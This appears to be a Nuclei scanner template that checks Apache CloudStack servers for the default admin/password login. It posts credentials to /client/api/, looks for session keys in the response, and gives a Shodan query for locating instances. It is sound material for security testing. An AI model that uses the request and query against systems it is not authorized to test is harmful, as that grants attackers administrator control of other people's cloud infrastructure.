http:
- attack: pitchfork
  host-redirects: true
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(content_type, 'application/json')
    - contains_all(body, 'sessionkey','domainid','userid')
    type: dsl
  payloads:
    password:
    - password
    username:
    - admin
  raw:
  - 'POST /client/api/ HTTP/1.1

    Host: {{Hostname}}

    Accept: application/json, text/plain, */*

    Content-Type: application/x-www-form-urlencoded


    command=login&username={{username}}&password={{password}}&domain=%2F&response=json

    '
id: cloudstack-default-login
info:
  author: DhiyaneshDK
  classification:
    cpe: cpe:2.3:a:apache:cloudstack:*:*:*:*:*:*:*:*
  description: 'CloudStack instance discovered using weak default credentials, allows
    the attacker to gain admin privilege.

    '
  metadata:
    max-request: 1
    product: cloudstack
    shodan-query: http.title:"Apache CloudStack"
    vendor: apache
    verified: true
  name: Apache CloudStack - Default Login
  severity: high
  tags: default-login,apache,cloudstack
